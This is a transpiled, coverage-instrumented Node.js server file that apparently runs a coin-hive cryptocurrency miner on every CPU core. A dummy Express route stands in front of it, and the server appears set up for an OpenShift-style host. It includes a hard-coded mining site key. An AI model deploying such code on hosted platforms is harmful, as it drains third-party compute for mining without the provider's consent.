'use strict';

var _asyncToGenerator2 = require('babel-runtime/helpers/asyncToGenerator');

var _asyncToGenerator3 = _interopRequireDefault(_asyncToGenerator2);

var cov_1w4cyjyjex = function () {
    var path = '/Users/zon/Projects/example/coin-miner-copy/src/app.js',
        hash = 'a5632f281269526ee5e0725e3df8b23706044c01',
        global = new Function('return this')(),
        gcv = '__coverage__',
        coverageData = {
        path: '/Users/zon/Projects/example/coin-miner-copy/src/app.js',
        statementMap: {
            '0': {
                start: {
                    line: 4,
                    column: 17
                },
                end: {
                    line: 4,
                    column: 37
                }
            },
            '1': {
                start: {
                    line: 6,
                    column: 16
                },
                end: {
                    line: 6,
                    column: 43
                }
            },
            '2': {
                start: {
                    line: 7,
                    column: 0
                },
                end: {
                    line: 7,
                    column: 68
                }
            },
            '3': {
                start: {
                    line: 8,
                    column: 0
                },
                end: {
                    line: 8,
                    column: 66
                }
            },
            '4': {
                start: {
                    line: 10,
                    column: 0
                },
                end: {
                    line: 45,
                    column: 1
                }
            },
            '5': {
                start: {
                    line: 11,
                    column: 4
                },
                end: {
                    line: 13,
                    column: 5
                }
            },
            '6': {
                start: {
                    line: 12,
                    column: 8
                },
                end: {
                    line: 12,
                    column: 23
                }
            },
            '7': {
                start: {
                    line: 15,
                    column: 16
                },
                end: {
                    line: 15,
                    column: 25
                }
            },
            '8': {
                start: {
                    line: 16,
                    column: 4
                },
                end: {
                    line: 16,
                    column: 20
                }
            },
            '9': {
                start: {
                    line: 17,
                    column: 4
                },
                end: {
                    line: 17,
                    column: 31
                }
            },
            '10': {
                start: {
                    line: 18,
                    column: 4
                },
                end: {
                    line: 18,
                    column: 53
                }
            },
            '11': {
                start: {
                    line: 20,
                    column: 4
                },
                end: {
                    line: 36,
                    column: 7
                }
            },
            '12': {
                start: {
                    line: 21,
                    column: 8
                },
                end: {
                    line: 21,
                    column: 80
                }
            },
            '13': {
                start: {
                    line: 22,
                    column: 8
                },
                end: {
                    line: 35,
                    column: 13
                }
            },
            '14': {
                start: {
                    line: 23,
                    column: 12
                },
                end: {
                    line: 34,
                    column: 13
                }
            },
            '15': {
                start: {
                    line: 24,
                    column: 30
                },
                end: {
                    line: 24,
                    column: 80
                }
            },
            '16': {
                start: {
                    line: 25,
                    column: 16
                },
                end: {
                    line: 25,
                    column: 36
                }
            },
            '17': {
                start: {
                    line: 26,
                    column: 16
                },
                end: {
                    line: 26,
                    column: 63
                }
            },
            '18': {
                start: {
                    line: 26,
                    column: 40
                },
                end: {
                    line: 26,
                    column: 61
                }
            },
            '19': {
                start: {
                    line: 27,
                    column: 16
                },
                end: {
                    line: 27,
                    column: 69
                }
            },
            '20': {
                start: {
                    line: 27,
                    column: 43
                },
                end: {
                    line: 27,
                    column: 67
                }
            },
            '21': {
                start: {
                    line: 28,
                    column: 16
                },
                end: {
                    line: 31,
                    column: 55
                }
            },
            '22': {
                start: {
                    line: 28,
                    column: 43
                },
                end: {
                    line: 31,
                    column: 53
                }
            },
            '23': {
                start: {
                    line: 33,
                    column: 16
                },
                end: {
                    line: 33,
                    column: 31
                }
            },
            '24': {
                start: {
                    line: 37,
                    column: 4
                },
                end: {
                    line: 44,
                    column: 7
                }
            },
            '25': {
                start: {
                    line: 38,
                    column: 8
                },
                end: {
                    line: 43,
                    column: 9
                }
            },
            '26': {
                start: {
                    line: 39,
                    column: 12
                },
                end: {
                    line: 40,
                    column: 49
                }
            },
            '27': {
                start: {
                    line: 42,
                    column: 12
                },
                end: {
                    line: 42,
                    column: 60
                }
            },
            '28': {
                start: {
                    line: 46,
                    column: 0
                },
                end: {
                    line: 49,
                    column: 3
                }
            },
            '29': {
                start: {
                    line: 47,
                    column: 4
                },
                end: {
                    line: 47,
                    column: 112
                }
            },
            '30': {
                start: {
                    line: 48,
                    column: 4
                },
                end: {
                    line: 48,
                    column: 19
                }
            }
        },
        fnMap: {
            '0': {
                name: '(anonymous_0)',
                decl: {
                    start: {
                        line: 20,
                        column: 58
                    },
                    end: {
                        line: 20,
                        column: 59
                    }
                },
                loc: {
                    start: {
                        line: 20,
                        column: 64
                    },
                    end: {
                        line: 36,
                        column: 5
                    }
                },
                line: 20
            },
            '1': {
                name: '(anonymous_1)',
                decl: {
                    start: {
                        line: 22,
                        column: 9
                    },
                    end: {
                        line: 22,
                        column: 10
                    }
                },
                loc: {
                    start: {
                        line: 22,
                        column: 21
                    },
                    end: {
                        line: 35,
                        column: 9
                    }
                },
                line: 22
            },
            '2': {
                name: '(anonymous_2)',
                decl: {
                    start: {
                        line: 26,
                        column: 34
                    },
                    end: {
                        line: 26,
                        column: 35
                    }
                },
                loc: {
                    start: {
                        line: 26,
                        column: 40
                    },
                    end: {
                        line: 26,
                        column: 61
                    }
                },
                line: 26
            },
            '3': {
                name: '(anonymous_3)',
                decl: {
                    start: {
                        line: 27,
                        column: 37
                    },
                    end: {
                        line: 27,
                        column: 38
                    }
                },
                loc: {
                    start: {
                        line: 27,
                        column: 43
                    },
                    end: {
                        line: 27,
                        column: 67
                    }
                },
                line: 27
            },
            '4': {
                name: '(anonymous_4)',
                decl: {
                    start: {
                        line: 28,
                        column: 35
                    },
                    end: {
                        line: 28,
                        column: 36
                    }
                },
                loc: {
                    start: {
                        line: 28,
                        column: 43
                    },
                    end: {
                        line: 31,
                        column: 53
                    }
                },
                line: 28
            },
            '5': {
                name: '(anonymous_5)',
                decl: {
                    start: {
                        line: 37,
                        column: 17
                    },
                    end: {
                        line: 37,
                        column: 18
                    }
                },
                loc: {
                    start: {
                        line: 37,
                        column: 31
                    },
                    end: {
                        line: 44,
                        column: 5
                    }
                },
                line: 37
            },
            '6': {
                name: '(anonymous_6)',
                decl: {
                    start: {
                        line: 46,
                        column: 19
                    },
                    end: {
                        line: 46,
                        column: 20
                    }
                },
                loc: {
                    start: {
                        line: 46,
                        column: 50
                    },
                    end: {
                        line: 49,
                        column: 1
                    }
                },
                line: 46
            }
        },
        branchMap: {
            '0': {
                loc: {
                    start: {
                        line: 10,
                        column: 0
                    },
                    end: {
                        line: 45,
                        column: 1
                    }
                },
                type: 'if',
                locations: [{
                    start: {
                        line: 10,
                        column: 0
                    },
                    end: {
                        line: 45,
                        column: 1
                    }
                }, {
                    start: {
                        line: 10,
                        column: 0
                    },
                    end: {
                        line: 45,
                        column: 1
                    }
                }],
                line: 10
            },
            '1': {
                loc: {
                    start: {
                        line: 20,
                        column: 15
                    },
                    end: {
                        line: 20,
                        column: 56
                    }
                },
                type: 'binary-expr',
                locations: [{
                    start: {
                        line: 20,
                        column: 15
                    },
                    end: {
                        line: 20,
                        column: 48
                    }
                }, {
                    start: {
                        line: 20,
                        column: 52
                    },
                    end: {
                        line: 20,
                        column: 56
                    }
                }],
                line: 20
            },
            '2': {
                loc: {
                    start: {
                        line: 21,
                        column: 52
                    },
                    end: {
                        line: 21,
                        column: 76
                    }
                },
                type: 'binary-expr',
                locations: [{
                    start: {
                        line: 21,
                        column: 52
                    },
                    end: {
                        line: 21,
                        column: 68
                    }
                }, {
                    start: {
                        line: 21,
                        column: 72
                    },
                    end: {
                        line: 21,
                        column: 76
                    }
                }],
                line: 21
            },
            '3': {
                loc: {
                    start: {
                        line: 47,
                        column: 96
                    },
                    end: {
                        line: 47,
                        column: 110
                    }
                },
                type: 'binary-expr',
                locations: [{
                    start: {
                        line: 47,
                        column: 96
                    },
                    end: {
                        line: 47,
                        column: 102
                    }
                }, {
                    start: {
                        line: 47,
                        column: 106
                    },
                    end: {
                        line: 47,
                        column: 110
                    }
                }],
                line: 47
            }
        },
        s: {
            '0': 0,
            '1': 0,
            '2': 0,
            '3': 0,
            '4': 0,
            '5': 0,
            '6': 0,
            '7': 0,
            '8': 0,
            '9': 0,
            '10': 0,
            '11': 0,
            '12': 0,
            '13': 0,
            '14': 0,
            '15': 0,
            '16': 0,
            '17': 0,
            '18': 0,
            '19': 0,
            '20': 0,
            '21': 0,
            '22': 0,
            '23': 0,
            '24': 0,
            '25': 0,
            '26': 0,
            '27': 0,
            '28': 0,
            '29': 0,
            '30': 0
        },
        f: {
            '0': 0,
            '1': 0,
            '2': 0,
            '3': 0,
            '4': 0,
            '5': 0,
            '6': 0
        },
        b: {
            '0': [0, 0],
            '1': [0, 0],
            '2': [0, 0],
            '3': [0, 0]
        },
        _coverageSchema: '332fd63041d2c1bcb487cc26dd0d5f7d97098a6c'
    },
        coverage = global[gcv] || (global[gcv] = {});

    if (coverage[path] && coverage[path].hash === hash) {
        return coverage[path];
    }

    coverageData.hash = hash;
    return coverage[path] = coverageData;
}();

var _express = require('express');

var _express2 = _interopRequireDefault(_express);

var _cors = require('cors');

var _cors2 = _interopRequireDefault(_cors);

var _bodyParser = require('body-parser');

var _bodyParser2 = _interopRequireDefault(_bodyParser);

var _cluster = require('cluster');

var _cluster2 = _interopRequireDefault(_cluster);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

const CoinHive = (cov_1w4cyjyjex.s[0]++, require('coin-hive'));

const numCPUs = (cov_1w4cyjyjex.s[1]++, require('os').cpus().length);
cov_1w4cyjyjex.s[2]++;
process.env.NODE_VERSION_URL = 'https://semver.io/node/resolve/8.5.0';
cov_1w4cyjyjex.s[3]++;
process.env.NPM_VERSION_URL = 'https://semver.io/npm/resolve/5.4.2';

cov_1w4cyjyjex.s[4]++;
if (_cluster2.default.isMaster) {
    cov_1w4cyjyjex.b[0][0]++;
    cov_1w4cyjyjex.s[5]++;

    for (let i = 0; i < numCPUs; i++) {
        cov_1w4cyjyjex.s[6]++;

        _cluster2.default.fork();
    }
} else {
    cov_1w4cyjyjex.b[0][1]++;

    const app = (cov_1w4cyjyjex.s[7]++, (0, _express2.default)());
    cov_1w4cyjyjex.s[8]++;
    app.use((0, _cors2.default)());
    cov_1w4cyjyjex.s[9]++;
    app.use(_bodyParser2.default.json());
    cov_1w4cyjyjex.s[10]++;
    app.use(_bodyParser2.default.urlencoded({ extended: true }));

    cov_1w4cyjyjex.s[11]++;
    app.listen((cov_1w4cyjyjex.b[1][0]++, process.env.OPENSHIFT_NODEJS_PORT) || (cov_1w4cyjyjex.b[1][1]++, 5000), () => {
        cov_1w4cyjyjex.f[0]++;
        cov_1w4cyjyjex.s[12]++;

        console.log(`HTTP server is listening at: ${(cov_1w4cyjyjex.b[2][0]++, process.env.PORT) || (cov_1w4cyjyjex.b[2][1]++, 5000)}`);
        cov_1w4cyjyjex.s[13]++;
        (0, _asyncToGenerator3.default)(function* () {
            cov_1w4cyjyjex.f[1]++;
            cov_1w4cyjyjex.s[14]++;

            try {
                const miner = (cov_1w4cyjyjex.s[15]++, yield CoinHive('yhh5a4CEYpQgw2aQFoHAfNB8ZCdWzbRY'));
                cov_1w4cyjyjex.s[16]++;
                yield miner.start();
                cov_1w4cyjyjex.s[17]++;
                miner.on('found', function () {
                    cov_1w4cyjyjex.f[2]++;
                    cov_1w4cyjyjex.s[18]++;
                    return console.log('Found!');
                });
                cov_1w4cyjyjex.s[19]++;
                miner.on('accepted', function () {
                    cov_1w4cyjyjex.f[3]++;
                    cov_1w4cyjyjex.s[20]++;
                    return console.log('Accepted!');
                });
                cov_1w4cyjyjex.s[21]++;
                miner.on('update', function (data) {
                    cov_1w4cyjyjex.f[4]++;
                    cov_1w4cyjyjex.s[22]++;
                    return console.log(`
            Hashes per second: ${data.hashesPerSecond}
            Total hashes: ${data.totalHashes}
            Accepted hashes: ${data.acceptedHashes}`);
                });
            } catch (e) {
                cov_1w4cyjyjex.s[23]++;

                console.log(e);
            }
        })();
    });
    cov_1w4cyjyjex.s[24]++;
    app.get('*', (req, res) => {
        cov_1w4cyjyjex.f[5]++;
        cov_1w4cyjyjex.s[25]++;

        try {
            cov_1w4cyjyjex.s[26]++;

            res.status(200).json({ message: 'Successfully!' });
        } catch (e) {
            cov_1w4cyjyjex.s[27]++;

            res.json({ message: 'Oops! Somethings wrong...' });
        }
    });
}
cov_1w4cyjyjex.s[28]++;
_cluster2.default.on('exit', function (worker, code, signal) {
    cov_1w4cyjyjex.f[6]++;
    cov_1w4cyjyjex.s[29]++;

    console.log('Worker %d died with code/signal %s. Restarting worker...', worker.process.pid, (cov_1w4cyjyjex.b[3][0]++, signal) || (cov_1w4cyjyjex.b[3][1]++, code));
    cov_1w4cyjyjex.s[30]++;
    _cluster2.default.fork();
});